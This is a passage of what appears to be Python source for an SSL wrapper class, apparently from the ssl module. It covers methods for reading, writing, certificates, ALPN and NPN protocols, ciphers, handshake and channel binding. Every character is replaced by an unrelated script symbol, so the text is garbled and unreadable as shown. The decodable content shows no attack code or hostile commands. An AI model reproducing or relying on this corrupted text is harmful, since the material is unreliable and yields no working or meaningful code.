ꛯꚳ꛷꛰꛹ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꜁ꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜂꛽꛴꛿꛰ꚳ꛾꛰꛷꛱ꚷꚫꛯꛬ꛿ꛬꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛢ꛽꛴꛿꛰ꚫꚲꛯꛬ꛿ꛬꚲꚫ꛿꛺ꚫ꛿꛳꛰ꚫꛞꛞꛗꚫ꛺ꛭ꛵꛰ꛮ꛿ꚫꛬ꛹ꛯꚫ꛽꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂꛽꛴꛿꛿꛰꛹ꚹꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛟ꛳꛰ꚫꚲꛯꛬ꛿ꛬꚲꚫꛬ꛽꛲꜀꛸꛰꛹꛿ꚫ꛸꜀꛾꛿ꚫ꛾꜀꛻꛻꛺꛽꛿ꚫ꛿꛳꛰ꚫꛭ꜀꛱꛱꛰꛽ꚫ꛴꛹꛿꛰꛽꛱ꛬꛮ꛰ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꜂꛽꛴꛿꛰ꚳꛯꛬ꛿ꛬꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛲꛰꛿꛻꛰꛰꛽ꛮ꛰꛽꛿ꚳ꛾꛰꛷꛱ꚷꚫꛭ꛴꛹ꛬ꛽꜄ꛪ꛱꛺꛽꛸ꛈꛑꛬ꛷꛾꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹꛾ꚫꛬꚫ꛱꛺꛽꛸ꛬ꛿꛿꛰ꛯꚫ꜁꛰꛽꛾꛴꛺꛹ꚫ꛺꛱ꚫ꛿꛳꛰ꚫꛯꛬ꛿ꛬꚫ꛴꛹ꚫ꛿꛳꛰ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꛻꛽꛺꜁꛴ꛯ꛰ꛯꚕꚫꚫꚫꚫꚫꚫꚫꚫꛭ꜄ꚫ꛿꛳꛰ꚫ꛺꛿꛳꛰꛽ꚫ꛰꛹ꛯꚫ꛺꛱ꚫ꛿꛳꛰ꚫꛞꛞꛗꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚹꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫꛝ꛰꛿꜀꛽꛹ꚫꛙ꛺꛹꛰ꚫ꛴꛱ꚫ꛹꛺ꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꜂ꛬ꛾ꚫ꛻꛽꛺꜁꛴ꛯ꛰ꛯꚷꚫ꜆꜈ꚫ꛴꛱ꚫꛬꚫꛮ꛰꛽꛿꛴꛱꛴ꛮꛬ꛿꛰ꚫ꜂ꛬ꛾ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛻꛽꛺꜁꛴ꛯ꛰ꛯꚷꚫꛭ꜀꛿ꚫ꛹꛺꛿ꚫ꜁ꛬ꛷꛴ꛯꛬ꛿꛰ꛯꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛲꛰꛿꛻꛰꛰꛽ꛮ꛰꛽꛿ꚳꛭ꛴꛹ꛬ꛽꜄ꛪ꛱꛺꛽꛸ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛷꛰ꛮ꛿꛰ꛯꛪ꛹꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫꛮ꜀꛽꛽꛰꛹꛿꛷꜄ꚫ꛾꛰꛷꛰ꛮ꛿꛰ꛯꚫꛙꛛꛙꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫꛬ꛾ꚫꛬꚫ꛾꛿꛽꛴꛹꛲ꚷꚫ꛺꛽ꚫꛫꛫꛙ꛺꛹꛰ꛫꛫꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛬꚫ꛹꛰꜃꛿ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꜂ꛬ꛾ꚫ꛹꛺꛿ꚫ꛹꛰꛲꛺꛿꛴ꛬ꛿꛰ꛯꚫ꛺꛽ꚫ꛴꛱ꚫꛙꛛꛙꚫ꛴꛾ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫꛭ꜄ꚫ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛻꛰꛰꛽꛾ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꜂ꛬ꛽꛹꛴꛹꛲꛾ꚹ꜂ꛬ꛽꛹ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛾꛾꛷ꚫꛙꛛꛙꚫ꛴꛾ꚫꛯ꛰꛻꛽꛰ꛮꛬ꛿꛰ꛯꚷꚫ꜀꛾꛰ꚫꛌꛗꛛꛙꚫ꛴꛹꛾꛿꛰ꛬꛯꚭꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛏ꛰꛻꛽꛰ꛮꛬ꛿꛴꛺꛹ꛢꛬ꛽꛹꛴꛹꛲ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛿ꛬꛮ꛶꛷꛰꜁꛰꛷ꛈꚽꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛰꛷꛰ꛮ꛿꛰ꛯꛪꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫꛮ꜀꛽꛽꛰꛹꛿꛷꜄ꚫ꛾꛰꛷꛰ꛮ꛿꛰ꛯꚫꛌꛗꛛꛙꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫꛬ꛾ꚫꛬꚫ꛾꛿꛽꛴꛹꛲ꚷꚫ꛺꛽ꚫꛫꛫꛙ꛺꛹꛰ꛫꛫꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛬꚫ꛹꛰꜃꛿ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꜂ꛬ꛾ꚫ꛹꛺꛿ꚫ꛹꛰꛲꛺꛿꛴ꛬ꛿꛰ꛯꚫ꛺꛽ꚫ꛴꛱ꚫꛌꛗꛛꛙꚫ꛴꛾ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫꛭ꜄ꚫ꛺꛹꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛻꛰꛰꛽꛾ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛰꛷꛰ꛮ꛿꛰ꛯꛪꛬ꛷꛻꛹ꛪ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛴꛻꛳꛰꛽ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫꛮ꜀꛽꛽꛰꛹꛿꛷꜄ꚫ꛾꛰꛷꛰ꛮ꛿꛰ꛯꚫꛮ꛴꛻꛳꛰꛽ꚫꛬ꛾ꚫꛬꚫꚾꚸ꛿꜀꛻꛷꛰ꚫꛫꛫꚳ꛹ꛬ꛸꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛾꛷ꛪ꜁꛰꛽꛾꛴꛺꛹ꚷꚫ꛾꛰ꛮ꛽꛰꛿ꛪꛭ꛴꛿꛾ꚴꛫꛫꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛮ꛴꛻꛳꛰꛽ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛾꛳ꛬ꛽꛰ꛯꛪꛮ꛴꛻꛳꛰꛽꛾ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫꛬꚫ꛷꛴꛾꛿ꚫ꛺꛱ꚫꛮ꛴꛻꛳꛰꛽꛾ꚫ꛾꛳ꛬ꛽꛰ꛯꚫꛭ꜄ꚫ꛿꛳꛰ꚫꛮ꛷꛴꛰꛹꛿ꚫꛯ꜀꛽꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚫ꛺꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛙ꛺꛹꛰ꚫ꛴꛱ꚫ꛿꛳꛴꛾ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛬꚫ꜁ꛬ꛷꛴ꛯꚫ꛾꛰꛽꜁꛰꛽ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚹꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛳ꛬ꛽꛰ꛯꛪꛮ꛴꛻꛳꛰꛽꛾ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛮ꛺꛸꛻꛽꛰꛾꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫꛮ꜀꛽꛽꛰꛹꛿ꚫꛮ꛺꛸꛻꛽꛰꛾꛾꛴꛺꛹ꚫꛬ꛷꛲꛺꛽꛴꛿꛳꛸ꚫ꛴꛹ꚫ꜀꛾꛰ꚷꚫ꛺꛽ꚫꛫꛫꛙ꛺꛹꛰ꛫꛫꚫ꛴꛱ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛸꛻꛽꛰꛾꛾꛴꛺꛹ꚫ꜂ꛬ꛾ꚫ꛹꛺꛿ꚫ꛹꛰꛲꛺꛿꛴ꛬ꛿꛰ꛯꚫ꛺꛽ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚫꛭ꜄ꚫ꛺꛹꛰ꚫ꛺꛱ꚫ꛿꛳꛰ꚫ꛻꛰꛰꛽꛾ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛮ꛺꛸꛻꛽꛰꛾꛾꛴꛺꛹ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛻꛰꛹ꛯ꛴꛹꛲ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫ꛿꛳꛰ꚫ꛹꜀꛸ꛭ꛰꛽ꚫ꛺꛱ꚫꛭ꜄꛿꛰꛾ꚫ꛿꛳ꛬ꛿ꚫꛮꛬ꛹ꚫꛭ꛰ꚫ꛽꛰ꛬꛯꚫ꛴꛸꛸꛰ꛯ꛴ꛬ꛿꛰꛷꜄ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛻꛰꛹ꛯ꛴꛹꛲ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛞ꛿ꛬ꛽꛿ꚫ꛿꛳꛰ꚫꛞꛞꛗꚺꛟꛗꛞꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜀꛹꜂꛽ꛬ꛻ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛞ꛿ꛬ꛽꛿ꚫ꛿꛳꛰ꚫꛞꛞꛗꚫ꛾꛳꜀꛿ꛯ꛺꜂꛹ꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛾꛳꜀꛿ꛯ꛺꜂꛹ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꛲꛰꛿ꛪꛮ꛳ꛬ꛹꛹꛰꛷ꛪꛭ꛴꛹ꛯ꛴꛹꛲ꚳ꛾꛰꛷꛱ꚷꚫꛮꛭꛪ꛿꜄꛻꛰ꛈꚭ꛿꛷꛾ꚸ꜀꛹꛴꛼꜀꛰ꚭꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛒ꛰꛿ꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚫꛭ꛴꛹ꛯ꛴꛹꛲ꚫꛯꛬ꛿ꛬꚫ꛱꛺꛽ꚫꛮ꜀꛽꛽꛰꛹꛿ꚫꛮ꛺꛹꛹꛰ꛮ꛿꛴꛺꛹ꚹꚫꚫꛝꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛿꛳꛰ꚫ꛽꛰꛼꜀꛰꛾꛿꛰ꛯꚫꛫꛮꛭꛪ꛿꜄꛻꛰ꛫꚫ꛴꛾ꚫ꛹꛺꛿ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚹꚫꚫꛝ꛰꛿꜀꛽꛹ꚫꛭ꜄꛿꛰꛾ꚫ꛺꛱ꚫ꛿꛳꛰ꚫꛯꛬ꛿ꛬꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛺꛽ꚫꛙ꛺꛹꛰ꚫ꛴꛱ꚫ꛿꛳꛰ꚫꛯꛬ꛿ꛬꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛬ꜁ꛬ꛴꛷ꛬꛭ꛷꛰ꚫꚳ꛰ꚹ꛲ꚹꚫꛭ꛰꛱꛺꛽꛰ꚫ꛿꛳꛰ꚫ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚴꚹꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꛲꛰꛿ꛪꛮ꛳ꛬ꛹꛹꛰꛷ꛪꛭ꛴꛹ꛯ꛴꛹꛲ꚳꛮꛭꛪ꛿꜄꛻꛰ꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛾꛴꛺꛹ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚭꚭꚭꛝ꛰꛿꜀꛽꛹ꚫꛬꚫ꛾꛿꛽꛴꛹꛲ꚫ꛴ꛯ꛰꛹꛿꛴꛱꜄꛴꛹꛲ꚫ꛿꛳꛰ꚫ꛻꛽꛺꛿꛺ꛮ꛺꛷ꚫ꜁꛰꛽꛾꛴꛺꛹ꚫ꜀꛾꛰ꛯꚫꛭ꜄ꚫ꛿꛳꛰ꚕꚫꚫꚫꚫꚫꚫꚫꚫꛮ꜀꛽꛽꛰꛹꛿ꚫꛞꛞꛗꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚹꚫꚭꚭꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꜁꛰꛽꛾꛴꛺꛹ꚳꚴꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫ꜁꛰꛽꛴꛱꜄ꛪꛮ꛷꛴꛰꛹꛿ꛪ꛻꛺꛾꛿ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳ꛾꛰꛷꛱ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛾꛰꛷꛱ꚹꛪ꛾꛾꛷꛺ꛭ꛵ꚹ꜁꛰꛽꛴꛱꜄ꛪꛮ꛷꛴꛰꛹꛿ꛪ꛻꛺꛾꛿ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꚳꚴꚕꚕꚕꛯ꛰꛱ꚫꛪ꛾꛾꛷ꛮ꛺꛻꜄ꛯ꛺ꛮꚳ꛱꜀꛹ꛮꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛎ꛺꛻꜄ꚫꛯ꛺ꛮ꛾꛿꛽꛴꛹꛲ꚫ꛱꛽꛺꛸ꚫꛞꛞꛗꛚꛭ꛵꛰ꛮ꛿ꚫ꛿꛺ꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚭꚭꚭꚕꚫꚫꚫꚫ꛱꜀꛹ꛮꚹꛪꛪꛯ꛺ꛮꛪꛪꚫꛈꚫ꛲꛰꛿ꛬ꛿꛿꛽ꚳꛞꛞꛗꛚꛭ꛵꛰ꛮ꛿ꚷꚫ꛱꜀꛹ꛮꚹꛪꛪ꛹ꛬ꛸꛰ꛪꛪꚴꚹꛪꛪꛯ꛺ꛮꛪꛪꚕꚫꚫꚫꚫ꛽꛰꛿꜀꛽꛹ꚫ꛱꜀꛹ꛮꚕꚕꚕꛮ꛷ꛬ꛾꛾ꚫꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚳ꛾꛺ꛮ꛶꛰꛿ꚴꛅꚕꚫꚫꚫꚫꚭꚭꚭꛟ꛳꛴꛾ꚫꛮ꛷ꛬ꛾꛾ꚫ꛴꛸꛻꛷꛰꛸꛰꛹꛿꛾ꚫꛬꚫ꛾꜀ꛭ꛿꜄꛻꛰ꚫ꛺꛱ꚫ꛾꛺ꛮ꛶꛰꛿ꚹ꛾꛺ꛮ꛶꛰꛿ꚫ꛿꛳ꛬ꛿ꚫ꜂꛽ꛬ꛻꛾ꚕꚫꚫꚫꚫ꛿꛳꛰ꚫ꜀꛹ꛯ꛰꛽꛷꜄꛴꛹꛲ꚫꛚꛞꚫ꛾꛺ꛮ꛶꛰꛿ꚫ꛴꛹ꚫꛬ꛹ꚫꛞꛞꛗꚫꛮ꛺꛹꛿꛰꜃꛿ꚫ꜂꛳꛰꛹ꚫ꛹꛰ꛮ꛰꛾꛾ꛬ꛽꜄ꚷꚫꛬ꛹ꛯꚕꚫꚫꚫꚫ꛻꛽꛺꜁꛴ꛯ꛰꛾ꚫ꛽꛰ꛬꛯꚫꛬ꛹ꛯꚫ꜂꛽꛴꛿꛰ꚫ꛸꛰꛿꛳꛺ꛯ꛾ꚫ꛺꜁꛰꛽ꚫ꛿꛳ꛬ꛿ꚫꛮ꛳ꛬ꛹꛹꛰꛷ꚹꚫꚭꚭꚭꚕꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛪ꛴꛹꛴꛿ꛪꛪꚳ꛾꛰꛷꛱ꚷꚫꚵꛬ꛽꛲꛾ꚷꚫꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛟ꜄꛻꛰ꛐ꛽꛽꛺꛽ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꚭ꜆꛾꛰꛷꛱ꚹꛪꛪꛮ꛷ꛬ꛾꛾ꛪꛪꚹꛪꛪ꛹ꛬ꛸꛰ꛪꛪ꜈ꚫꛯ꛺꛰꛾ꚫ꛹꛺꛿ꚫ꛳ꛬ꜁꛰ꚫꛬꚫ꛻꜀ꛭ꛷꛴ꛮꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꚭꛮ꛺꛹꛾꛿꛽꜀ꛮ꛿꛺꛽ꚹꚫꛔ꛹꛾꛿ꛬ꛹ꛮ꛰꛾ꚫꛬ꛽꛰ꚫ꛽꛰꛿꜀꛽꛹꛰ꛯꚫꛭ꜄ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꚭꛞꛞꛗꛎ꛺꛹꛿꛰꜃꛿ꚹ꜂꛽ꛬ꛻ꛪ꛾꛺ꛮ꛶꛰꛿ꚳꚴꚹꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚕꚫꚫꚫꚫꛋꛮ꛷ꛬ꛾꛾꛸꛰꛿꛳꛺ꛯꚕꚫꚫꚫꚫꛯ꛰꛱ꚫꛪꛮ꛽꛰ꛬ꛿꛰ꚳꛮ꛷꛾ꚷꚫ꛾꛺ꛮ꛶ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛈꛑꛬ꛷꛾꛰ꚷꚫꛯ꛺ꛪ꛳ꛬ꛹ꛯ꛾꛳ꛬ꛶꛰ꛪ꛺꛹ꛪꛮ꛺꛹꛹꛰ꛮ꛿ꛈꛟ꛽꜀꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛻꛽꛰꛾꛾ꛪ꛽ꛬ꛲꛲꛰ꛯꛪ꛰꛺꛱꛾ꛈꛟ꛽꜀꛰ꚷꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛈꛙ꛺꛹꛰ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꛮ꛺꛹꛿꛰꜃꛿ꛈꛙ꛺꛹꛰ꚷꚫ꛾꛰꛾꛾꛴꛺꛹ꛈꛙ꛺꛹꛰ꚴꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛺ꛮ꛶ꚹ꛲꛰꛿꛾꛺ꛮ꛶꛺꛻꛿ꚳꛞꛚꛗꛪꛞꛚꛎꛖꛐꛟꚷꚫꛞꛚꛪꛟꛤꛛꛐꚴꚫꚬꛈꚫꛞꛚꛎꛖꛪꛞꛟꛝꛐꛌꛘꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛙ꛺꛿ꛔ꛸꛻꛷꛰꛸꛰꛹꛿꛰ꛯꛐ꛽꛽꛺꛽ꚳꚭ꛺꛹꛷꜄ꚫ꛾꛿꛽꛰ꛬ꛸ꚫ꛾꛺ꛮ꛶꛰꛿꛾ꚫꛬ꛽꛰ꚫ꛾꜀꛻꛻꛺꛽꛿꛰ꛯꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛾꛴ꛯ꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꛮꛬ꛹ꚫ꛺꛹꛷꜄ꚫꛭ꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭ꛴꛹ꚫꛮ꛷꛴꛰꛹꛿ꚫ꛸꛺ꛯ꛰ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫ꛾꛰꛾꛾꛴꛺꛹ꚫ꛴꛾ꚫ꛹꛺꛿ꚫꛙ꛺꛹꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭ꛾꛰꛾꛾꛴꛺꛹ꚫꛮꛬ꛹ꚫ꛺꛹꛷꜄ꚫꛭ꛰ꚫ꛾꛻꛰ꛮ꛴꛱꛴꛰ꛯꚫ꛴꛹ꚫꚭꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚭꛮ꛷꛴꛰꛹꛿ꚫ꛸꛺ꛯ꛰ꚭꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛴꛱ꚫꛮ꛺꛹꛿꛰꜃꛿ꚹꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫꛬ꛹ꛯꚫ꛹꛺꛿ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꛅꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛽ꛬ꛴꛾꛰ꚫꛡꛬ꛷꜀꛰ꛐ꛽꛽꛺꛽ꚳꚭꛮ꛳꛰ꛮ꛶ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚫ꛽꛰꛼꜀꛴꛽꛰꛾ꚫ꛾꛰꛽꜁꛰꛽ꛪ꛳꛺꛾꛿꛹ꛬ꛸꛰ꚭꚴꚕꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛶꜂ꛬ꛽꛲꛾ꚫꛈꚫꛯ꛴ꛮ꛿ꚳꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱ꛬ꛸꛴꛷꜄ꛈ꛾꛺ꛮ꛶ꚹ꛱ꛬ꛸꛴꛷꜄ꚷꚫ꛿꜄꛻꛰ꛈ꛾꛺ꛮ꛶ꚹ꛿꜄꛻꛰ꚷꚫ꛻꛽꛺꛿꛺ꛈ꛾꛺ꛮ꛶ꚹ꛻꛽꛺꛿꛺ꚷꚕꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫꚫ꛱꛴꛷꛰꛹꛺ꛈ꛾꛺ꛮ꛶ꚹ꛱꛴꛷꛰꛹꛺ꚳꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛰꛷꛱ꚫꛈꚫꛮ꛷꛾ꚹꛪꛪ꛹꛰꜂ꛪꛪꚳꛮ꛷꛾ꚷꚫꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꜀꛻꛰꛽ꚳꛞꛞꛗꛞ꛺ꛮ꛶꛰꛿ꚷꚫ꛾꛰꛷꛱ꚴꚹꛪꛪ꛴꛹꛴꛿ꛪꛪꚳꚵꚵ꛶꜂ꛬ꛽꛲꛾ꚴꚕꚫꚫꚫꚫꚫꚫꚫꚫ꛾꛺ꛮ꛶ꛪ꛿꛴꛸꛰꛺꜀꛿ꚫꛈꚫ꛾꛺ꛮ꛶